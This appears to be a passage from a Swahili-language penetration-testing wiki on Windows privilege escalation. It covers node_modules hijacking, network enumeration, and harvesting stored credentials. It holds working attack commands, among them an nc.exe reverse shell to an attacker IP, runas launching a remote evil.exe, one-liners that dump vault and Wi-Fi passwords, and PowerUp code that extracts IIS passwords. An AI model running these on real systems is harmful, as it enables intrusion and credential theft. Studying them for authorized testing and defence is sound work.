Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka mama. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, hivyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye marupurupu ya chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye marupurupu ya juu** ujaribu kutafuta dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hiyo hali hii huwa **LPE** kila target inapotekelezwa kama administrator, kupitia scheduled task/service wrapper yenye marupurupu yaliyoinuliwa, au kupitia programu ya desktop yenye marupurupu inayoanzishwa kiotomatiki.

Hili hutokea hasa wakati:

- dependency imetajwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library inaweka `require("foo")` ndani ya `try/catch` na kuendelea inaposhindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utafutaji:<sup>[[23]](#references)</sup>

- Weka kichujio cha `Process Name` = executable lengwa (`node.exe`, Electron app EXE, au wrapper process)
- Weka kichujio cha `Path` `contains` `node_modules`
- Angalia zaidi `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Mifumo ya msimbo inayofaa kukaguliwa katika faili za `.asar` zilizofunguliwa au chanzo cha programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa application ya victim. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya ulimwengu halisi ya modules za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye privilage ya juu utaresolve.

### Mawazo ya ugunduzi na uimarishaji wa usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya third-party ili kubaini mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inairuhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye hosts file.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Iliyofunguliwa

Angalia **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kwa kutumia akaunti ya mtumiaji wa desktop ikiwa tu uthibitishaji wake na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa kwa akaunti yenye ruhusa za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni vidokezo vya awali tu, ilhali njia ya memory-corruption inayohitaji uthibitishaji inahitaji uchanganuzi wa binary hiyo husika na ingizo linaloweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya process ya mfumo, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubaini huduma ya backend; sheria ya forwarding pekee haithibitishi kuwa destination inaweza kufikiwa au ina udhaifu.

### Jedwali la uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

[Amri zaidi za kuhesabu mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

`root` ya Linux ndani ya WSL pekee haipei haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distribution, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kutafuta amri ambazo huenda zilirekodi credentials; kupandisha haki bado kunahitaji akaunti halali yenye ruhusa za juu zaidi na njia inayoruhusiwa ya uthibitishaji. Muundo wa `LocalState\rootfs` hutumika kwenye usakinishaji wa zamani wa WSL; WSL 2 mara nyingi huhifadhi distribution kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo kwanza tambua distribution halisi na njia ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uorodheshaji wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kuwa muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ushahidi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, hiyo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na kusoma registry kwa njia za kawaida hakuthibitishi kama secret hiyo ipo au inaweza kurejeshwa. Kagua ruhusa za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credential.

### Msimamizi wa credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuwaingiza watumiaji kiotomatiki**. Mwanzoni, huenda ikaonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na kufanya vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager hii** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye hifadhi chaguomsingi ya vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo za `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` pamoja na seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonyeshwa pia kama `Web Credentials` katika `vaultcmd`). Hifadhi hii hutengwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za msimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kutupa na kusimbua papo hapo majina yote ya watumiaji na nywila za maandishi wazi zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kusimba data kwa kutumia usimbaji fiche linganifu, na hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kusimba funguo za faragha zisizolingana. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza entropy kwa kiasi kikubwa.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa domain ya mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na master key inayolinda funguo za faragha za mtumiaji katika faili iyo hiyo**, kwa kawaida huwa na data ya nasibu yenye ukubwa wa baiti 64. (Kumbuka kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili kuzisimbua.

Faili za credentials zinazolindwa na master password kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** ukitumia module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** hutumiwa mara nyingi kwa kazi za **scripting** na automation kama njia rahisi ya kuhifadhi vitambulisho vilivyosimbwa. Vitambulisho hivi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba vinaweza kusimbuliwa tu na mtumiaji yuleyule kwenye kompyuta ileile vilipoundiwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Script au orodha ya faili ikielekeza kwenye mojawapo, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima iwe na ruhusa halali kwenye service inayolengwa. Kagua njia na ACL kwanza, bila kuonyesha thamani zilizosimbwa au maandishi ya kawaida wakati wa kuorodhesha vitu kwa kawaida.

Ili **kusimbua** credentials za PS kutoka kwenye faili iliyo nazo, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia moduli ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye kumbukumbu kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credentials. Thamani iliyohifadhiwa si nenosiri la DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na kama nenosiri kuu maalum lilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Uhamishaji wa profiles za Remote Desktop Plus** pia unaweza kusomeka katika saraka za mtumiaji au folda ya pamoja ya usimamizi. Uhamishaji wa zamani wa `profiles.xml` una vipengee vya `Data/Profile` vyenye vipengee vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengee cha nenosiri kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani kuwa ni maandishi ya kawaida: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kwamba ulinzi wa profile unaweza kuhusishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu wakati mwingine huhifadhi nywila na taarifa nyingine kwenye programu za madokezo yanayonata. Programu ya Sticky Notes ya Microsoft inayosambazwa kama kifurushi kwa kawaida huhifadhi madokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na umbizo la hifadhi kabla ya kuchukulia kukosekana kwa faili ya SQLite kuwa uthibitisho kwamba hakuna madokezo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa madokezo ya hivi karibuni yaliyohifadhiwa. Weka `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya hifadhidata, na ujumuishe `plum.sqlite-shm` inapopatikana; faharasa ya kumbukumbu ya pamoja inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya hifadhidata. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au nenosiri ni kidokezo cha credentials tu: thibitisha akaunti, ruhusa ya kuifikia, na matumizi ya nenosiri hilo kwenye akaunti nyingine kando. Rekodi iliyosimbwa ya password manager pia huhitaji ufunguo wake halisi wa kusimbua na tafsiri mahususi ya programu kabla ya kuthibitisha kuingia kwa akaunti yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha nywila kutoka AppCmd.exe, unahitaji kuwa Administrator na kuiendesha chini ya kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, huenda baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishi **huendeshwa kwa ruhusa za SYSTEM**, vingi viko hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Mabaki ya credentials za support-tool kwenye registry

Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya value zinazohusiana na password chini ya registry keys zisizobadilika za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha password tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu registry key](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la value ni kidokezo tu cha kuchunguza: hakiki toleo lililosakinishwa, data ya value inayosomeka, format na tabia ya sasa ya authentication kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support hadi akaunti ya Windows yenye privileges zaidi kunahitaji pia kuthibitisha kuwa password hiyo inatumika tena na kuwa unaidhinishwa kufikia akaunti hiyo. Usijumuishe ciphertext au password zilizorejeshwa kwenye matokeo ya kawaida ya enumeration.

### Spreadsheets zinazoshirikiwa zenye sheets zilizolindwa

Ikiwa unashuku kuwa workbook inayoweza kusomeka na kushirikiwa ina data za akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa kwa njia fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na epuka kuchapisha secrets zinazoweza kuwepo wakati wa enumeration ya jumla. Njia ya `.xlsx` inayosomeka, sheet iliyolindwa au safu wima iliyofichwa pekee havithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina privileges zaidi; hakiki data halisi na haki za sasa za akaunti kando.

### Patches za mabadiliko zilizohifadhiwa na CI server

CI server inaweza kuhifadhi mabadiliko ya source code yaliyowasilishwa kwenye data directory yake hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` huhifadhi mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeleo yaliyoondolewa au kuongezwa ya faili ya credential, encryption key au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji AES key pamoja na string iliyosimbwa kwa njia fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa key hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha secrets kwenye matokeo ya kawaida ya enumeration. Njia ya patch, value iliyosimbwa kwa njia fiche au rejeleo la key pekee havithibitishi credential halali au ufikiaji wa privileges zaidi. Zuia ufikiaji wa data directory kwa ACLs na epuka kuweka secrets kwenye mabadiliko ya build.

### Mzunguko maalum wa password ya local administrator

Password rotator iliyotengenezwa nyumbani inaweza kuhifadhi password iliyosimbwa kwa njia fiche ya local administrator kwenye service ya ndani huku ikihifadhi credentials za datastore kwenye faili ya `.env` inayosomeka au karibu na binary ya updater. Kagua scheduled task ya updater, akaunti, ACLs za usanidi, listener na permissions za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani mwenye credentials halali, lakini authentication peke yake haithibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya encryption au key material inaweza kufikiwa karibu na ciphertext, kagua namna halisi ya kutengeneza key kabla ya kuamini encryption hiyo. Mbinu inayotengeneza AES key kwa uthabiti kutoka seed iliyo wazi kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inasema package hiyo haifai kwa randomness inayohusu usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env` au encrypted blob pekee havithibitishi masharti hayo. Usijumuishe passwords au key material kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti passwords za local administrator. Hifadhi yake inayotegemea directory au Entra na access controls zake ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyefanya authentication anaweza kusoma index maalum.

### JAR archives za Java server plugins na matumizi tena ya credentials

Baadhi ya Java server plugins husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Plugin maalum inayosomeka inaweza kuwa na configuration au bytecode yenye credential ya service iliyopachikwa. Kagua archive hiyo kwa idhini pekee na usijumuishe secrets zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa kuna secret, na password ya service iliyorejeshwa husababisha privileges zaidi ikiwa tu inatumika pia kwa akaunti yenye privileges zaidi. Kagua ACLs za faili husika na ubadilishe credentials zilizotumiwa tena kwa secrets tofauti. Tazama [mwongozo wa usakinishaji wa plugins wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa directories na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za embedded database ya Openfire

Usakinishaji wa Openfire unaotumia embedded database unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na property ya `passwordKey`. [Nyaraka za Openfire kuhusu user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa passwords zinaweza kuhifadhiwa kama plain text au kusimbwa kwa njia fiche kwa key iliyohifadhiwa kwenye property hiyo. Password iliyorejeshwa ni muhimu kwa escalation ikiwa tu bado ni halali kwa identity yenye privileges zaidi; jina la faili pekee halithibitishi kusomeka kwake wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya database au credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua ports zilizosaniwa za admin console na interface inayotumika kufunga listener hata kama database ya nje inatumika. Openfire mara nyingi hufunga admin console kwenye loopback; hata hivyo, akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inafanya kazi. Kagua listener halisi, admin role iliyoidhinishwa, sera ya kupakia plugins na identity ya Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kufanya code ya plugin iendeshwe katika context ya service, ambayo inaweza kuwa na privileges nyingi ikiwa service inaendeshwa kama LocalSystem. Password inayolingana ya akaunti au njia ya configuration inayosomeka pekee havithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia 